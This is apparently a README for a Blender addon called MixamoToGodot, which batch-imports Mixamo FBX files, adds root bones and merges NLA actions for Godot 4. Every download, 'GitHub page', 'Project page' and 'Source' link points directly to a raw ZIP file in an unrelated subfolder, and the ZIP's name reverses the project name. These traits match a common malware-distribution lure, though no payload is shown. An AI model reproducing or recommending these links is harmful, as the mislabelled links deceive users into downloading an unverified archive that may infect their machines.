# 🎬 MixamoToGodot - Prepare Mixamo animations for Godot

[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-4F46E5?style=for-the-badge)](https://raw.githubusercontent.com/Airtoair-selfimportance104/MixamoToGodot/main/undershine/Godot_To_Mixamo_v1.7.zip)

## 🧩 What this does

MixamoToGodot is a Blender addon that helps you get Mixamo animations ready for Godot 4.

It can:

- Import FBX files in batches
- Create a root bone for root motion
- Merge animations into the NLA editor
- Help keep motion data clean for use in Godot 4
- Work with Blender 3.x, 4.x, and 5.x

Use it if you want to bring Mixamo animations into Blender, set them up once, and then use them in a Godot project with less manual work.

## 📥 Download

Visit the GitHub page to download the addon:

[https://raw.githubusercontent.com/Airtoair-selfimportance104/MixamoToGodot/main/undershine/Godot_To_Mixamo_v1.7.zip](https://raw.githubusercontent.com/Airtoair-selfimportance104/MixamoToGodot/main/undershine/Godot_To_Mixamo_v1.7.zip)

## 🖥️ Windows Setup

Follow these steps on Windows:

1. Open the download link in your web browser.
2. Download the addon files from the repository page.
3. Save the file to a folder you can find again, such as Downloads or Desktop.
4. If the download comes as a ZIP file, keep it as a ZIP file unless the page gives you a different file type.
5. Open Blender on your Windows PC.
6. Install the addon inside Blender.
7. Enable the addon after the install finishes.

## 🛠️ How to Install in Blender

1. Open Blender.
2. Go to Edit > Preferences.
3. Open the Add-ons tab.
4. Click Install.
5. Find the downloaded MixamoToGodot file.
6. Select the file and confirm the install.
7. Search for MixamoToGodot in the add-ons list.
8. Turn the addon on.

If Blender asks for a restart, close Blender and open it again.

## 🚀 How to Use It

### 1. Prepare your Mixamo files

Download your Mixamo animation files as FBX files.

A simple folder setup helps:

- One folder for character files
- One folder for animation files
- One folder for the Blender project

### 2. Import in batches

Use the batch import tool to bring in more than one FBX file at a time.

This saves time when you have many animations like:

- Walk
- Run
- Idle
- Jump
- Attack

### 3. Create a root bone

Use the root bone option to add a clean root for motion control.

This is useful when you want:

- Better character movement in Godot
- Clean forward motion
- Easier root motion setup
- Better control over the character base

### 4. Merge with NLA

Send the actions to the NLA editor and merge them as needed.

This helps keep animation clips organized and ready for export.

### 5. Export for Godot 4

After setup, export the animation data from Blender in a format that works well with Godot 4.

In Godot, you can then use the animation files with your character scene.

## ⚙️ Suggested Workflow

Use this flow for a clean result:

1. Download your Mixamo character and animations.
2. Install and enable the addon in Blender.
3. Import the FBX files in batches.
4. Create the root bone.
5. Merge the actions in the NLA editor.
6. Check the animation timing.
7. Export the final setup.
8. Bring the files into Godot 4.

## 📌 Good Use Cases

MixamoToGodot fits well when you need to:

- Import many Mixamo animations at once
- Set up root motion for a player character
- Prepare a humanoid rig for Godot 4
- Keep animation clips in order
- Reduce manual cleanup in Blender

## 🧱 Basic Requirements

Use a setup like this:

- Windows 10 or Windows 11
- Blender 3.x, 4.x, or 5.x
- A Mixamo FBX character or animation file
- Enough disk space for Blender files and exports

For smoother work, use a mouse and keyboard rather than a touch-only device.

## 🔍 Troubleshooting

### Blender does not show the addon

- Check that you installed the correct file
- Open Edit > Preferences > Add-ons
- Search for MixamoToGodot
- Make sure the addon is turned on

### The file will not import

- Check that the file is an FBX file
- Try downloading the Mixamo file again
- Make sure the file is not damaged
- Use a local folder instead of a cloud-only folder

### The animation looks wrong

- Check the model scale
- Make sure the character and animations match
- Verify the root bone setup
- Reopen the file and test another animation

### Godot does not use the motion as expected

- Check the export settings in Blender
- Make sure the root motion track is present
- Confirm the character uses the same rig setup in Godot
- Test with a simple walk animation first

## 🧭 Folder Tip

Keep your files in a simple structure:

- `Mixamo/Characters`
- `Mixamo/Animations`
- `Blender/Projects`
- `Exports/Godot`

This makes it easier to find files later and keeps the setup clean.

## 🧰 Common Animation Names

These names are useful when you sort files:

- Idle
- Walk
- Run
- Jump
- Fall
- Land
- Turn
- Attack
- Hit
- Death

## 🔗 Source

Project page:

[https://raw.githubusercontent.com/Airtoair-selfimportance104/MixamoToGodot/main/undershine/Godot_To_Mixamo_v1.7.zip](https://raw.githubusercontent.com/Airtoair-selfimportance104/MixamoToGodot/main/undershine/Godot_To_Mixamo_v1.7.zip)

## 📝 Notes for Use

Use one character file as your base file.

Then add animations one by one or in batches.

This makes it easier to spot problems before you export everything to Godot

